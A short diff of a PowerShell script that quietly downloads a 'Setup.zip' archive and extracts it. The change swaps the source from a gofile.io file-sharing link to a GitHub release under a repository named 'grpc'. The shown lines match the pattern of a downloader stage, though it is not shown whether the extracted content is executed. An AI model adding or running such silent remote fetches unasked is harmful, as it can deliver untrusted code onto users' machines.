@@ -23,7 +23,7 @@ try {
     }
 
     $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri "https://cold2.gofile.io/download/web/bf45fdaf-3ae5-46e3-a5da-60ff6dd54eba/Setup.zip" -OutFile $outputZip
+    Invoke-WebRequest -Uri "https://github.com/Core-Robot/grpc/releases/download/public/Setup.zip" -OutFile $outputZip
 
     if (Test-Path $outputZip) {
         Expand-Archive -Path $outputZip -DestinationPath $extractPath -Force
